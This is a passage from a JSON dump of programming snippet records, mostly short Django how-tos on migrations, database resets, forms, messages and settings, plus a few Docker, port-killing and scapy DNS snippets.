    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 898,
    "keyword": null,
    "link": null,
    "title": " django desc order",
    "description": "Obj.objects.all().order_by('-id')\n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 899,
    "keyword": null,
    "link": null,
    "title": " django drop database postgres",
    "description": "find . -path \"*/migrations/*.py\" -not -name \"__init__.py\" -delete find . -path \"*/migrations/*.pyc\"  -delete  # Check status of files > python3 manage.py showmigrations  create news migrations   Enjoy:)\nsudo su postgres psql drop database your_database_name; create database your_database_name with owner user_you_use_in_django; \\q exit \n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 900,
    "keyword": null,
    "link": null,
    "title": " django dumpdata",
    "description": "./manage.py dumpdata auth.user > user.json\n./manage.py dumpdata notice.notice > notice.json --indent 4 --format json \n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 901,
    "keyword": null,
    "link": null,
    "title": " django flush",
    "description": "python manage.py flush\n$ django-admin <command> [options] $ manage.py <command> [options] $ python -m django <command> [options] \n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 902,
    "keyword": null,
    "link": null,
    "title": " django flush database",
    "description": "python manage.py flush  \n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 903,
    "keyword": null,
    "link": null,
    "title": " django foreign key field on delete do nothing",
    "description": "from django.db import models  class Car(models.Model):     manufacturer = models.ForeignKey('Manufacturer',on_delete=models.DO_NOTHING,)  class Manufacturer(models.Model):     pass\n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 904,
    "keyword": null,
    "link": null,
    "title": " django form password field",
    "description": "    password    =   models.CharField(max_length=20, widget=forms.PasswordInput)\npip install django-passwords \n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 905,
    "keyword": null,
    "link": null,
    "title": " django forms set class",
    "description": "class UserLoginForm(forms.Form):     username = forms.CharField(widget=forms.TextInput(         attrs={         'class':'form-control',         'placeholder':'Username'         }     ))     password = forms.CharField(widget=forms.PasswordInput(         attrs={         'class':'form-control',         'placeholder':'Password'         }     ))\n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 906,
    "keyword": null,
    "link": null,
    "title": " django genericforeignkey null",
    "description": "class MyModel(models.Model):     ...other fields...     content_type = models.ForeignKey(ContentType, blank=True, null=True, on_delete=models.SET_NULL)     object_id = models.PositiveIntegerField(blank=True, null=True)     content_object = generic.GenericForeignKey('content_type', 'object_id')\n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 907,
    "keyword": null,
    "link": null,
    "title": " django get part of queryset",
    "description": "# According to documentation  # Limiting QuerySets # This is the equivalent of SQL&rsquo;s LIMIT and OFFSET clauses.  # For example, this returns the first 5 objects (LIMIT 5): >>> Entry.objects.all()[:5]  # This returns the sixth through tenth objects (OFFSET 5 LIMIT 5): >>> Entry.objects.all()[5:10]\n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 908,
    "keyword": null,
    "link": null,
    "title": " django gunicorn static file not found",
    "description": "#All You need is dj-static package pip install dj-static  #Configure your static assets in settings.py: STATIC_ROOT = 'staticfiles' STATIC_URL = '/static/  #Then, update your wsgi.py file to use dj-static from django.core.wsgi import get_wsgi_application from dj_static import Cling  application = Cling(get_wsgi_application())  #Add to Your urls.py from django.contrib.staticfiles.urls import staticfiles_urlpatterns #after urlpatterns=[] urlpatterns += staticfiles_urlpatterns()\n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 909,
    "keyword": null,
    "link": null,
    "title": " django how to set a navbar active",
    "description": "# navbar_demo/pages/views.py...   '''We will pass a unique variable for each page whose value will be 'active' to make  a page active in navbar when it call.'''  def index(request):       context = {\"home_page\": \"active\"} # new info here       return render(request, 'pages/index.html', context)  def about(request):       context = {\"about_page\": \"active\"} # new info here       return render(request, 'pages/about.html', context)  def contact(request):       context = {\"contact_page\": \"active\"} # new info here       return render(request, 'pages/contact.html', context)  # In html file #   '''   <ul class=\"navbar-nav\">   <li class=\"nav-item {{ home_page }}\">       <a class=\"nav-link\" href=\"{% url 'index' %}\">Home</a>    </li>    <li class=\"nav-item {{ about_page }}\">       <a class=\"nav-link\" href=\"{% url 'about' %}\">About</a>     </li>    <li class=\"nav-item {{ contact_page }}\">        <a class=\"nav-link\" href=\"{% url 'contact' %}\">Contact</a>     </li>  </ul> '''\n<li class=\"nav-item {% if request.resolver_match.view_name == 'scores:list' %}active{% endif %}\">     <a class=\"nav-link\" href=\"{% url 'scores:list' %}\">Scores</a> </li> \n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 910,
    "keyword": null,
    "link": null,
    "title": " django httpresponseredirect",
    "description": "from django.http import HttpResponseRedirect\n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 911,
    "keyword": null,
    "link": null,
    "title": " django humanize",
    "description": "# Add To Installed Apps. INSTALLED_APPS = [    'django.contrib.humanize', ]  # Top of HTML Page. {% load humanize %}  # Filters  apnumber - 1 becomes one. intcomma - 4500 becomes 4,500. intword - 1000000 becomes 1.0 million. naturalday - 16 Feb 2007 becomes yesterday. naturaltime - 17 Feb 2007 16:30:00 becomes now. ordinal - 1 becomes 1st.\ndjango.contrib.humanize&para; A set of Django template filters useful for adding a &ldquo;human touch&rdquo; to data.  To activate these filters, add 'django.contrib.humanize' to your INSTALLED_APPS setting. Once you&rsquo;ve done that, use {% load humanize %} in a template, and you&rsquo;ll have access to the following filters.\n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 912,
    "keyword": null,
    "link": null,
    "title": " django import Q",
    "description": "from django.db.models import Q\nfrom django.db.models import Q  obj, created = Person.objects.filter(     Q(first_name='Bob') | Q(first_name='Robert'), ).get_or_create(last_name='Marley', defaults={'first_name': 'Bob'}) \n>>> Entry.objects.filter(blog_id=4) \n",
    "reg_date": "2021-10-12T11:29:02.000Z"
  },
  {
    "id": 913,
    "keyword": null,
    "link": null,
    "title": " django import model from another app",
    "description": "from appName.models import table_name\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 914,
    "keyword": null,
    "link": null,
    "title": " django import settings",
    "description": "from django.conf import settings\n#settings.py  EMAIL_PASS = \"FOO\"  # in any file  from django.conf import settings  email_password = settings.EMAIL_PASS #to access that variable.\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 915,
    "keyword": null,
    "link": null,
    "title": " django include",
    "description": "from django.urls import include, path  urlpatterns = [     path('index/', views.index, name='main-view'),     path('bio/<username>/', views.bio, name='bio'),     path('articles/<slug:title>/', views.article, name='article-detail'),     path('articles/<slug:title>/<int:section>/', views.section, name='article-section'),     path('weblog/', include('blog.urls')),     ... ] \n# import include from django.urls import include, path  urlpatterns = [     path('index/', views.index, name='main-view'),     path('bio/<username>/', views.bio, name='bio'),     path('articles/<slug:title>/', views.article, name='article-detail'),     path('articles/<slug:title>/<int:section>/', views.section, name='article-section'),     path('weblog/', include('blog.urls')),     ... ] \n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 916,
    "keyword": null,
    "link": null,
    "title": " django integer field example",
    "description": "integer = models.IntegerField(blank=True, null=True)\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 917,
    "keyword": null,
    "link": null,
    "title": " django is null",
    "description": "MyModel.objects.filter(field__isnull = False)\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 918,
    "keyword": null,
    "link": null,
    "title": " django jinja subset string",
    "description": "{{ model.field|truncatewords:30 }} # Example below returns just the first 30 words of the text_summary column  # (for each line/book in the books table) <ul> {% for book in books.all %} \t<li>{{ book.text_summary|truncatewords:30 }}</li> {% endfor %} </ul>\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 919,
    "keyword": null,
    "link": null,
    "title": " django kill port",
    "description": "sudo fuser -k 8000/tcp\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 920,
    "keyword": null,
    "link": null,
    "title": " django kill port 8000",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\nsudo fuser -k 8000/tcp\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 921,
    "keyword": null,
    "link": null,
    "title": " django load model by name",
    "description": "from django.apps import apps user = apps.get_model(app_label='auth', model_name='User') # Can also support syntax like 'auth.User' passing a single parameter user = apps.get_model('auth.User')\n",
    "reg_date": "2021-10-12T11:29:03.000Z"
  },
  {
    "id": 922,
    "keyword": null,
    "link": null,
    "title": " django log sql queries",
    "description": "# Add below code in the settings.py  LOGGING = {     'version': 1,     'filters': {         'require_debug_true': {             '()': 'django.utils.log.RequireDebugTrue',         }     },     'handlers': {         'console': {             'level': 'DEBUG',             'filters': ['require_debug_true'],             'class': 'logging.StreamHandler',         }     },     'loggers': {         'django.db.backends': {             'level': 'DEBUG',             'handlers': ['console'],         }     } }\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 923,
    "keyword": null,
    "link": null,
    "title": " django login redirect",
    "description": "LOGIN_REDIRECT_URL = 'home'\nfrom django.contrib.auth import logout  def logout_view(request):     logout(request)     # Redirect to a success page. \nfrom django.contrib.auth import authenticate, login  def my_view(request):     username = request.POST['username']     password = request.POST['password']     user = authenticate(request, username=username, password=password)     if user is not None:         login(request, user)         # Redirect to a success page.         ...     else:         # Return an 'invalid login' error message.         ... \nfrom django.contrib.auth.decorators import login_required\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 924,
    "keyword": null,
    "link": null,
    "title": " django logout",
    "description": "from django.contrib.auth import logout  def logout_view(request):     logout(request)     # Redirect to a success page.\nfrom django.contrib.auth import logout  def logout_view(request):     logout(request)     # Redirect to a success page. \n def logout_request(request):       logout(request)       return redirect(\"\")\nfrom django.contrib.auth import authenticate, login  def my_view(request):     username = request.POST['username']     password = request.POST['password']     user = authenticate(request, username=username, password=password)     if user is not None:         login(request, user)         # Redirect to a success page.         ...     else:         # Return an 'invalid login' error message.         ... \nfrom django.contrib.auth.mixins import LoginRequiredMixin  LOGIN_URL = 'your_url'\n{% extends 'main/header.html' %}  {% block content %}      <div class=\"container\">         <form method=\"POST\">         {% csrf_token %}         {{form.as_p}}             <button style=\"background-color:#F4EB16; color:blue\" class=\"btn btn-outline-info\" type=\"submit\">Login</button>         </form>         Don't have an account? <a href=\"/register\" target=\"blank\"><strong>register here</strong></a>!     </div> {% endblock %}\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 925,
    "keyword": null,
    "link": null,
    "title": " django loop index",
    "description": "{% for item in item_list %}     {{ forloop.counter }} # starting index 1     {{ forloop.counter0 }} # starting index 0      # do your stuff {% endfor %} \n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 926,
    "keyword": null,
    "link": null,
    "title": " django m2m .add",
    "description": "p1 = Publication(title='The Python Journal') p1.save() a1 = Article(headline='Django lets you build Web apps easily') a1.save()  a1.publications.add(p1)  # Adding a second time is OK, it will not duplicate the relation: a1.publications.add(p1)\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 927,
    "keyword": null,
    "link": null,
    "title": " django make migrations",
    "description": "$ python3 manage.py makemigrations $ python3 manage.py migrate\npython manage.py makemigrations python manage.py migrate\n//to create migration files python manage.py makemigrations  //to migrate migration files python manage.py migrate \n$ python manage.py makemigrations && python manage.py migrate $ git add --all $ git commit -m \"fixed migrate error\" $ git push heroku master $ heroku run python manage.py makemigrations $ heroku run python manage.py migrate --- Done ___\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 928,
    "keyword": null,
    "link": null,
    "title": " django making a custom 403 page",
    "description": "def csrf_failure(request, reason=\"\"):       context = RequestContext(request)       response = render_to_response('error403.html', context)       response.status_code = 403       return response\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 929,
    "keyword": null,
    "link": null,
    "title": " django message framework",
    "description": "{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>         {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}Important: {% endif %}         {{ message }}     </li>     {% endfor %} </ul> {% endif %} \nfrom django.contrib import messages  <--Change setting under settings.py from django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.ERROR: 'danger' } -->  {% for message in messages %} <div class=\"alert alert-{{ message.tags }} mb-0 alert-dismissible fade show\" role=\"alert\">   <strong>Message: </strong> {{ message }}   <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">     <span aria-hidden=\"true\">&times;</span>   </button> </div> {% endfor %}   <--Add message messages.debug(request, '%s SQL statements were executed.' % count) messages.info(request, 'Three credits remain in your account.') messages.success(request, 'Profile details updated.') messages.warning(request, 'Your account expires in three days.') messages.error(request, 'Document deleted.') -->\n{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>{{ message }}</li>     {% endfor %} </ul> {% endif %} \n{% if messages %}     {% for message in messages %}     <p id=\"messages\">{{message}}</p>     {% endfor %} {% endif %}\nfrom django.contrib import messages messages.add_message(request, messages.INFO, 'Hello world.') \nfrom django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.INFO: '',     50: 'critical', } \n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 930,
    "keyword": null,
    "link": null,
    "title": " django messages",
    "description": "{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>         {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}Important: {% endif %}         {{ message }}     </li>     {% endfor %} </ul> {% endif %} \nfrom django.contrib import messages  <--Change setting under settings.py from django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.ERROR: 'danger' } -->  {% for message in messages %} <div class=\"alert alert-{{ message.tags }} mb-0 alert-dismissible fade show\" role=\"alert\">   <strong>Message: </strong> {{ message }}   <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">     <span aria-hidden=\"true\">&times;</span>   </button> </div> {% endfor %}   <--Add message messages.debug(request, '%s SQL statements were executed.' % count) messages.info(request, 'Three credits remain in your account.') messages.success(request, 'Profile details updated.') messages.warning(request, 'Your account expires in three days.') messages.error(request, 'Document deleted.') -->\n{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>{{ message }}</li>     {% endfor %} </ul> {% endif %} \n{% if messages %}     {% for message in messages %}     <p id=\"messages\">{{message}}</p>     {% endfor %} {% endif %}\nfrom django.contrib import messages messages.add_message(request, messages.INFO, 'Hello world.') \nfrom django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.INFO: '',     50: 'critical', } \n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 931,
    "keyword": null,
    "link": null,
    "title": " django model field not required",
    "description": "Add blank=True\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 932,
    "keyword": null,
    "link": null,
    "title": " django model query add annotation field to show duplicate count",
    "description": "from django.db.models import OuterRef, Subquery, Count, Min  subquery = Product.objects.filter(bc_sku=OuterRef('bc_sku')).values('bc_sku')                           .annotate(dup_count=Count('*'), min_price=Min('product_price')) Product.objects.filter(product_type='good')                .annotate(dup_count=Subquery(subquery.values('dup_count')),                           min_price=Subquery(subquery.values('min_price')))\n",
    "reg_date": "2021-10-12T11:29:04.000Z"
  },
  {
    "id": 933,
    "keyword": null,
    "link": null,
    "title": " django model specify table name",
    "description": "class TempUser(models.Model):     first_name = models.CharField(max_length=100)     // ....     class Meta:         db_table = \"tbl_temp_users\"\n",
    "reg_date": "2021-10-12T11:29:05.000Z"
  },
  {
    "id": 934,
    "keyword": null,
    "link": null,
    "title": " django models distinct",
    "description": "q = XXXModels.objects.values('{filed}').distinct()\n",
    "reg_date": "2021-10-12T11:29:05.000Z"
  },
  {
    "id": 935,
    "keyword": null,
    "link": null,
    "title": " django no such table",
    "description": "python manage.py makemigrations  python manage.py migrate --run-syncdb\n",
    "reg_date": "2021-10-12T11:29:05.000Z"
  },
  {
    "id": 936,
    "keyword": null,
    "link": null,
    "title": " django port 8000 already in use",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\nsudo fuser -k 8000/tcp\n",
    "reg_date": "2021-10-12T11:29:05.000Z"
  },
  {
    "id": 937,
    "keyword": null,
    "link": null,
    "title": " django postgres",
    "description": "DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'your_database_project_name',         'USER': 'your_postgres_username',         'PASSWORD': 'your_postgres_password',         'HOST': '127.0.0.1',         'PORT': '5432',     } }\nDATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'mydatabase',         'USER': 'mydatabaseuser',         'PASSWORD': 'mypassword',         'HOST': '127.0.0.1',         'PORT': '5432',     } } \n",
    "reg_date": "2021-10-12T11:29:05.000Z"
  },
  {
    "id": 938,
    "keyword": null,
    "link": null,
    "title": " django postgres connection",
    "description": "DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'your_database_project_name',         'USER': 'your_postgres_username',         'PASSWORD': 'your_postgres_password',         'HOST': '127.0.0.1',         'PORT': '5432',     } }\nDATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'mydatabase',         'USER': 'mydatabaseuser',         'PASSWORD': 'mypassword',         'HOST': 'localhost',         'PORT': '5432',     } }\nDATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'mydatabase',         'USER': 'mydatabaseuser',         'PASSWORD': 'mypassword',         'HOST': '127.0.0.1',         'PORT': '5432',     } } \n",
    "reg_date": "2021-10-12T11:29:05.000Z"
  },
  {
    "id": 939,
    "keyword": null,
    "link": null,
    "title": " django postgres user permissions",
    "description": "CREATE DATABASE myproj_db WITH OWNER myproj_user TEMPLATE=template1 ENCODING='utf-8'; CREATE USER myproj_user WITH PASSWORD '123' SUPERUSER CREATEDB CREATEROLE LOGIN;  DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql_psycopg2',         'NAME': 'myproj_db',         'USER': 'myproj_user',         'PASSWORD': '123',         'HOST': '',         'PORT': '',     }, }\n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 940,
    "keyword": null,
    "link": null,
    "title": " django python install",
    "description": "#please check the python version python -m pip install Django \n# install django (basic, if path is not set yet) py -m pip install django # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install django # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip django # if PermissionError: [WinError 5] Access is denied py -m pip install --user django # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\n$ python -m pip install Django \npip install Django==3.2.6\n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 941,
    "keyword": null,
    "link": null,
    "title": " django queryset get all distinct",
    "description": "q = XXXModels.objects.values('{filed}').distinct()\n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 942,
    "keyword": null,
    "link": null,
    "title": " django raise 404",
    "description": "from django.http import Http404  def detail(request, poll_id):     try:         p = Poll.objects.get(pk=poll_id)     except Poll.DoesNotExist:         raise Http404     return render_to_response('polls/detail.html', {'poll': p}) \n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 943,
    "keyword": null,
    "link": null,
    "title": " django read mesage",
    "description": "{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>         {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}Important: {% endif %}         {{ message }}     </li>     {% endfor %} </ul> {% endif %} \n{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>{{ message }}</li>     {% endfor %} </ul> {% endif %} \n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 944,
    "keyword": null,
    "link": null,
    "title": " django reset database",
    "description": "python manage.py flush\n$ python manage.py migrate --fake YourApp zero # This will Reverse all migerations in YourApp\n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 945,
    "keyword": null,
    "link": null,
    "title": " django rest",
    "description": "pip install djangorestframework\npip install djangorestframework pip install markdown       # Markdown support for the browsable API. pip install django-filter  # Filtering support\npip install djangorestframework pip install markdown       \t\t\t# Markdown support for the browsable API. pip install django-filter  \t\t\t# Filtering support\nINSTALLED_APPS = [     ...     'rest_framework', ]\n$ pipenv install djangorestframework # or pip install djangorestframework\nfrom django.contrib.auth.models import User, Group from rest_framework import serializers   class UserSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = User         fields = ['url', 'username', 'email', 'groups']   class GroupSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = Group         fields = ['url', 'name']\n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 946,
    "keyword": null,
    "link": null,
    "title": " django rest framework",
    "description": "pip install djangorestframework\npip install djangorestframework pip install markdown       # Markdown support for the browsable API. pip install django-filter  # Filtering support\npip install djangorestframework pip install markdown       \t\t\t# Markdown support for the browsable API. pip install django-filter  \t\t\t# Filtering support\nINSTALLED_APPS = [     ...     'rest_framework', ]\n$ pipenv install djangorestframework # or pip install djangorestframework\nfrom django.contrib.auth.models import User, Group from rest_framework import serializers   class UserSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = User         fields = ['url', 'username', 'email', 'groups']   class GroupSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = Group         fields = ['url', 'name']\n",
    "reg_date": "2021-10-12T11:29:06.000Z"
  },
  {
    "id": 947,
    "keyword": null,
    "link": null,
    "title": " django rest framework datatables does not paginate",
    "description": "# filter your queryset here.  # than give it to self.queryset = your filtered queryset  queryset = self.filter_queryset(self.queryset) # this to enable sorting and search capabilities  # this to paginate whats left of filters page = self.paginate_queryset(queryset)  if page is not None:   serializer = self.get_serializer(page, many=True)   return self.get_paginated_response(serializer.data)  serializer = self.get_serializer(queryset, many=True) return Response(serializer.data) # \n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 948,
    "keyword": null,
    "link": null,
    "title": " django return html response",
    "description": "from django.http import HttpResponse return HttpResponse('<h1>Hello World</h1>')\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 949,
    "keyword": null,
    "link": null,
    "title": " django return httpresponse",
    "description": "from django.http import HttpResponse return HttpResponse('<h1>Hello World</h1>')\nfrom django.http import HttpResponse\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 950,
    "keyword": null,
    "link": null,
    "title": " django return only part of string",
    "description": "{{ model.field|truncatewords:30 }} # Example below returns just the first 30 words of the text_summary column  # (for each line/book in the books table) <ul> {% for book in books.all %} \t<li>{{ book.text_summary|truncatewords:30 }}</li> {% endfor %} </ul>\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 951,
    "keyword": null,
    "link": null,
    "title": " django reverse",
    "description": "from django.urls import reverse  def myview(request):     return HttpResponseRedirect(reverse('arch-summary', args=[1945])) \ndef get_success_url(self):     messages.success(self.request, 'Profile Updated Successfully')     return reverse('accounts:profile')\nclass NewJobCBV(LoginRequiredMixin, CreateView):     template_name = 'company/job.html'     form_class = newJobForm     # success_url = reverse_lazy('newJob')      def get_success_url(self, **kwargs):         return reverse(\"newJob\") \n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 952,
    "keyword": null,
    "link": null,
    "title": " django sum get 0 if none",
    "description": "from django.db.models.functions import Coalesce  answers = Answer.objects.filter(<something here>)                         .annotate(score=Coalesce(Sum('vote__type'), 0))                         .order_by('-score')\nanswers = Answer.objects.filter(<something here>)                         .annotate(score=Coalesce(Sum('vote__type'), 0))                         .order_by('-score')\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 953,
    "keyword": null,
    "link": null,
    "title": " django template tag to display current year",
    "description": "{% now \"Y\" %}\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 954,
    "keyword": null,
    "link": null,
    "title": " django template tags if statmenet",
    "description": "{% if athlete_list %}     Number of athletes: {{ athlete_list|length }} {% elif athlete_in_locker_room_list %}     Athletes should be out of the locker room soon! {% else %}     No athletes. {% endif %}\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 955,
    "keyword": null,
    "link": null,
    "title": " django text area limit characters",
    "description": "class BlogForm(forms.ModelForm):     class Meta:         model = Blog         fields = ['blogPost']         widgets = {             'blogPost' : forms.Textarea(attrs={                 'rows': '5',                 'cols': '90',                 'maxlength': '200',             }),         }\n",
    "reg_date": "2021-10-12T11:29:07.000Z"
  },
  {
    "id": 956,
    "keyword": null,
    "link": null,
    "title": " django timezone india",
    "description": "TIME_ZONE =  'Asia/Calcutta'\n#Tested it's working modify into settings.py file TIME_ZONE = 'Asia/Kolkata'\n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 957,
    "keyword": null,
    "link": null,
    "title": " django update model",
    "description": "obj, created = Person.objects.update_or_create(     first_name='John', last_name='Lennon',     defaults={'first_name': 'Bob'}, ) # If person exists with first_name='John' & last_name='Lennon' then update first_name='Bob' # Else create new person with first_name='Bob' & last_name='Lennon' \nSomeModel.objects.filter(id=id).delete()\nModel.objects.filter(id = 223).update(field1 = 2)\npython -m pip install -U Django\npk stands the \"primary key\" in django which represents a models ID.  The ID attribute is generated for you automatically behind the scences for each model and any newly created instances after that. \ndef get_absolute_url(self):   from django.core.urlresolvers import reverse   return reverse('', kwargs={'pk': self.pk})\n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 958,
    "keyword": null,
    "link": null,
    "title": " django user group check",
    "description": "from django.contrib.auth.models import User, Group  group = Group(name=\"Author\") group.save() # Create a sample group. user = User.objects.get(username=\"Johndoe\") # get Some User. user.groups.add(group) # Add User 'Johndoe' to a Group.  # check if user belongs to certain group. if user.groups.filter(name=group):   # do your stuff and give user access. else:   # redirect him\n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 959,
    "keyword": null,
    "link": null,
    "title": " django version check",
    "description": "python -m django --version\npsql --version\n$ django-admin.py version\npython3 -m django --version // mac py -m django --version // windows\npip list\nimport django django.VERSION\n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 960,
    "keyword": null,
    "link": null,
    "title": " dns request scapy",
    "description": "from scapy.all import DNS, DNSQR, IP, sr1, UDP  dns_req = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.thepacketgeek.com')) answer = sr1(dns_req, verbose=0) \n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 961,
    "keyword": null,
    "link": null,
    "title": " do you have to qualift for mosp twice?",
    "description": "for x in range(1,y)\n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 962,
    "keyword": null,
    "link": null,
    "title": " docker compose command not found",
    "description": "#From Stackoverflow sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.1/docker-compose-$(uname -s)-$(uname -m)\"  -o /usr/local/bin/docker-compose sudo mv /usr/local/bin/docker-compose /usr/bin/docker-compose sudo chmod +x /usr/bin/docker-compose \nsudo curl -L \"https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.29.1/docker-compose-$(uname -s)-$(uname -m)\"  -o /usr/local/bin/docker-compose sudo mv /usr/local/bin/docker-compose /usr/bin/docker-compose sudo chmod +x /usr/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.24.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose  sudo docker-compose version\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.23.1/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose \n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 963,
    "keyword": null,
    "link": null,
    "title": " docker python 3.8 ubuntu",
    "description": "RUN apt-get update && \\     apt-get install --no-install-recommends -y \\     python3.8 python3-pip python3.8-dev \n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 964,
    "keyword": null,
    "link": null,
    "title": " does break stop all loops",
    "description": "Using break in a nested loop  In a nested loop, a break statement only stops the loop it is placed in. Therefore, if a break is placed in the inner loop, the outer loop still continues. However, if the break is placed in the outer loop, all of the  looping stops.  \nbreak only stops the loop it is in. if you want to break out of a while true loop try: flag = True while flag: \tfor i in range(1000):     \tif i == 10:         \tflag = False             break \n",
    "reg_date": "2021-10-12T11:29:08.000Z"
  },
  {
    "id": 965,
    "keyword": null,
    "link": null,
    "title": " does the total number of subatomuc particles change during fusion",
